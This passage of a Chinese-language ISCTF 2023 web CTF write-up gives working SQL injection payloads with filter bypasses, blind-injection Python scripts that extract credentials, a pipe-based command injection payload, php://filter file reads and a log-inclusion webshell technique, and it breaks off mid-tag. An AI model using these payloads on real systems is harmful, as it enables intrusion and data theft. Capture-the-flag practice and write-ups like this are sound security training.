class="code"><pre><code class="hljs php">code=<span class="hljs-title function_ invoke__">print_r</span>(`c\at /f*`)<br></code></pre></td></tr></table></figure><h3 id="easy-website"><a href="#easy-website" class="headerlink" title="easy_website"></a><strong>easy_website</strong></h3><p>报错注入<br>注入点在username</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">-<span class="hljs-number">1</span><span class="hljs-string">&#x27;anandd(selselectect/**/extractvalue(1,concat(0x7e,database())))#      </span><br><span class="hljs-string">-&gt;  users</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span><span class="hljs-title function_ invoke__">anandd</span>(selselectect<span class="hljs-comment">/**/</span><span class="hljs-title function_ invoke__">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">concat</span>(<span class="hljs-number">0x7e</span>,(selselectect<span class="hljs-comment">/**/</span><span class="hljs-title function_ invoke__">group_concat</span>(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>infoorrmation_schema.tables<span class="hljs-comment">/**/</span>where <span class="hljs-comment">/**/</span>table_schema=<span class="hljs-title function_ invoke__">database</span>()))))<span class="hljs-comment">#</span><br>-&gt;  users<br><br><span class="hljs-string">&#x27;anandd(selselectect/**/extractvalue(1,concat(0x7e,(selselectect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where /**/table_name=database()))))#</span><br><span class="hljs-string">-&gt;user,password,USER</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span><span class="hljs-title function_ invoke__">anandd</span>(selselectect<span class="hljs-comment">/**/</span><span class="hljs-title function_ invoke__">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">concat</span>(<span class="hljs-number">0x7e</span>,<span class="hljs-title function_ invoke__">substr</span>((selselectect<span class="hljs-comment">/**/</span><span class="hljs-title function_ invoke__">group_concat</span>(passwoorrd)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>users),<span class="hljs-number">67</span>,<span class="hljs-number">98</span>))))<span class="hljs-comment">#</span><br>ISCTF&#123;<span class="hljs-number">94e8</span>d704-e303-<span class="hljs-number">4</span>fa2-<span class="hljs-number">8</span>ff<br><br><span class="hljs-string">&#x27;anandd(selselectect/**/extractvalue(1,concat(0x7e,substr((selselectect/**/group_concat(passwoorrd)/**/from/**/users),95,111))))#</span><br><span class="hljs-string">f-1d53192b3a22&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">ISCTF&#123;94e8d704-e303-4fa2-8fff-1d53192b3a22&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h3 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini"></a><strong>ez_ini</strong></h3><p>日志包含+.user.ini<br>nginx日志路径 /var/log/nginx/access.log<br><img src="/mdimg/isctf2023/1.png"><br>当前目录下有一个upload.php auto_prepend_file把木马加在这个php文件里<br><img src="/mdimg/isctf2023/2.png"></p><h3 id="webinclude"><a href="#webinclude" class="headerlink" title="webinclude"></a><strong>webinclude</strong></h3><p><img src="/mdimg/isctf2023/3.png"><br>逆一下index.bak里的函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">int_array_to_string</span>(<span class="hljs-params">intArr</span>) &#123;<br>  <span class="hljs-keyword">let</span> str = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; intArr.<span class="hljs-property">length</span>; i += <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-keyword">const</span> partA = intArr[i];<br>    <span class="hljs-keyword">const</span> partB = intArr[i + <span class="hljs-number">1</span>];<br><br>    <span class="hljs-keyword">const</span> charcode = (partA * <span class="hljs-number">26</span>) + partB;<br>    <span class="hljs-keyword">const</span> char = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(charcode);<br><br>    str += char;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> str;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">text_to_int_array</span>(<span class="hljs-params">txt</span>) &#123;<br>  <span class="hljs-keyword">let</span> int_array = [];<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; txt.<span class="hljs-property">length</span>; i++) &#123;<br>    <span class="hljs-keyword">const</span> charcode = txt.<span class="hljs-title function_">charCodeAt</span>(i) - <span class="hljs-number">97</span>;<br>    int_array.<span class="hljs-title function_">push</span>(charcode);<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> int_array;<br>&#125;<br><span class="hljs-keyword">const</span> hash = <span class="hljs-string">&quot;dxdydxdudxdtdxeadxekdxea&quot;</span>;<br><span class="hljs-keyword">const</span> flag = <span class="hljs-title function_">int_array_to_string</span>(<span class="hljs-title function_">text_to_int_array</span>(<span class="hljs-title function_">int_array_to_string</span>(<span class="hljs-title function_">text_to_int_array</span>(hash))))<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(flag);<br><br>#mihoyo<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">?mihoyo=<span class="hljs-attr">php</span>:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><h3 id="1z-Ssql"><a href="#1z-Ssql" class="headerlink" title="1z_Ssql"></a><strong>1z_Ssql</strong></h3><p>fuzz一下<br>过滤了：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs excel">for<br>where<br>+<br>=<br>like<br>union<br>sleep<br>sys<br>innodb<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">admin&#x27; <span class="hljs-keyword">and</span> <span class="hljs-built_in">length</span>(database()) &gt; <span class="hljs-number">5</span> <span class="hljs-comment">-- </span><br><span class="hljs-comment">---&gt; 库名长度为6</span><br></code></pre></td></tr></table></figure><p>判断正确的回显好像是</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">You are so smart! <span class="hljs-keyword">Let</span> <span class="hljs-keyword">me</span> give you a hint ↓ <span class="hljs-number">5</span>aSn5L2s77yM5L2g6L+Z5LmI6IGq5piO5bqU6K+l5LiN6ZyA6KaBaGludOWQpz8=<br></code></pre></td></tr></table></figure><p>源码里有sm4.js<br><img src="/mdimg/isctf2023/4.png"><br>base解码<br><img src="/mdimg/isctf2023/5.png"><br>6<br>继续盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&#x27;http://43.249.195.138:22521/&#x27;</span><br><span class="hljs-comment"># table=&quot;-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#for x in range(1,7):</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">15</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        data=&#123;<br>            <span class="hljs-comment">#  &quot;username&quot;:&quot;admin&#x27; and ascii(substr(database(),&#123;&#125;,&#123;&#125;)) &gt; &#123;&#125;  -- &quot;.format(x,x,i),</span><br>            <span class="hljs-comment">#version()</span><br>            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&#x27; and ascii(substr(user(),&#123;&#125;,&#123;&#125;)) &gt; &#123;&#125;  -- &quot;</span>.<span class="hljs-built_in">format</span>(x,x,i),<br>            <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<br>            <span class="hljs-string">&quot;submit&quot;</span>:<span class="hljs-string">&quot;登录&quot;</span><br>        &#125;<br>        r=requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are so smart!&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i))<br>            flag+=<span class="hljs-built_in">chr</span>(i)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#bthcls</span><br><span class="hljs-comment">#root@localhost</span><br><span class="hljs-comment">#10.6.14-MariaD</span><br></code></pre></td></tr></table></figure><p>接下来要爆表</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">ban了 </span>information_schema.tables  <br>可以用sys.<span class="hljs-keyword">schema_auto_increment_columns </span>  或者 sys.<span class="hljs-keyword">schema_table_statistics_with_buffer </span> 或者 sys.x$<span class="hljs-keyword">schema_flattened_keys</span><br><span class="hljs-keyword"></span>绕过(mysql5.<span class="hljs-number">7</span>+)   但是 sys也<span class="hljs-keyword">ban了</span><br><span class="hljs-keyword"></span>或者 mysql.innodb_table_stats  innodb也被<span class="hljs-keyword">ban了</span><br></code></pre></td></tr></table></figure><p>给了两个附件，猜测一个是表名一个是列名<br>爆破一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>table1 = []<br>table2 = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./some name1.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f1:<br>    line1 = f1.readlines()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> line1:<br>        table1.append(i.strip())<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./some name2.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f2:<br>    line2 = f2.readlines()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> line2:<br>        table2.append(i.strip())<br>url = <span class="hljs-string">&#x27;http://43.249.195.138:21759/&#x27;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table1:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> table2:<br>            payload= <span class="hljs-string">&quot;admin&#x27; and ascii(substr((select group_concat(&#123;&#125;) from bthcls.&#123;&#125;),1,1)) &gt; 0 -- &quot;</span>.<span class="hljs-built_in">format</span>(j,i)<br>            data= &#123;<br>                <span class="hljs-string">&quot;username&quot;</span>:payload,<br>                <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span><br>            &#125;<br>            r=requests.post(url,data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hint&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table&quot;</span>,i,<span class="hljs-string">&quot;columns&quot;</span>,j)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">table users columns password</span><br><span class="hljs-string">table users columns user</span><br><span class="hljs-string">table users columns username</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>开始盲注数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://43.249.195.138:21759/&#x27;</span><br>res=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">130</span><br>    mid = (high+low)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span>(low &lt; high):<br>        payload = <span class="hljs-string">&quot;admin&#x27; and ascii(substr((select group_concat(username,password) from bthcls.users),&#123;&#125;,1)) &gt; &#123;&#125; -- &quot;</span> .<span class="hljs-built_in">format</span>(i,mid)<br>        data = &#123;<br>                <span class="hljs-string">&#x27;username&#x27;</span>:payload,<br>                <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span><br>            &#125;<br>        r = requests.post(url=url,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hint&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>        mid = (low + high) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(mid) == <span class="hljs-string">&#x27; &#x27;</span>):<br>        <span class="hljs-keyword">break</span><br>    res  = res + <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-comment">#admin  we1come7o1sctf</span><br></code></pre></td></tr></table></figure><p>登录即可</p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz!"></a><strong>fuzz!</strong></h3><p>fuzz一下 中括号[]没ban [f] 匹配f | 管道符拼接命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">Read /flaggggggg.txt</span><br><span class="hljs-comment">Hint: 你需要学会fuzz，看着键盘一个一个对是没有灵魂的</span><br><span class="hljs-comment">知识补充：curl命令也可以用来读取文件哦，如curl file:///etc/passwd</span><br><span class="hljs-comment">*/</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;file:///etc/passwd&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\\\\|\&#x27;|\&quot;|\;|\&lt;|\&gt;|\,|\?|jay/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;你需要fuzz一下哦~&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/fi|le|flag/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;curl &#x27;</span>.<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=|cat /[f]laggggggg.txt<br></code></pre></td></tr></table></figure><h3 id="恐怖G7人-赛后出）"><a href="#恐怖G7人-赛后出）" class="headerlink" title="恐怖G7人 (赛后出）"></a><strong>恐怖G7人 (赛后出）</strong></h3><p>看这个cookie能pickle.load 以为是pickle反序列化 （怒<br>其实是ssti<br>fenjing就出了<br><img src="/mdimg/isctf2023/6.png"><br>app.py</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>猪王峡谷 排位赛联盟<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>了解这片土地，发现自身优势，然后纵身一跃<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>芜湖~这可真带劲<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>-----------------------------------------------------------------------------<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>这场战斗并非势均力敌，有多位大厨在做饭<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>-----------------------------------------------------------------------------<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>You are the ISCTF champion,flag in /champion<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>重伤倒地<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>from flask import Flask<br>      from flask import request<br>      from flask import config<br>      from flask import session<br>      from flask import make_response<br>      from flask import render_template_string<br>      from waf import waf<br>      import base64<br>      import pickle<br><br>      app = Flask(__name__)<br><br>      @app.route(&quot;/&quot;)<br>      def Hello():<br>      html = &#x27;&#x27;&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome ISCTF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello CTFer,Welcome to ISCTF 排位赛联盟<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>了解你的撼胃者<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#123;&#123;url_for(</span>&quot;<span class="hljs-attr">static</span>&quot;,<span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;/img/1.jpg&quot;</span>)&#125;&#125;&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>你知道我什么成分，来找我吧<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/zhuwangxiagu&quot;</span>&gt;</span> 前往猪王峡谷<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>&#x27;&#x27;&#x27;<br>      return render_template_string(html)<br><br>      @app.route(&quot;/zhuwangxiagu&quot;,methods=[&quot;GET&quot;,&quot;POST&quot;])<br>      def pig():<br>      html = &#x27;&#x27;&#x27;<br>      <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>猪王峡谷 排位赛联盟<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/game&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>选择你的角色<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;char&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span> = <span class="hljs-string">&quot;林肯死大头！&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>      &#x27;&#x27;&#x27;<br>      return html<br><br>      @app.route(&quot;/game&quot;,methods=[&quot;GET&quot;,&quot;POST&quot;])<br>      def game():<br>      name = request.form.get(&#x27;char&#x27;)<br>      # print(request.form)<br>      if name is None:<br>      name = &quot;undefined&quot;<br><br>      html = f&#x27;&#x27;&#x27;<br>      <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>猪王峡谷 排位赛联盟<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>了解这片土地，发现自身优势，然后纵身一跃<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>芜湖~这可真带劲<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>-----------------------------------------------------------------------------<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span 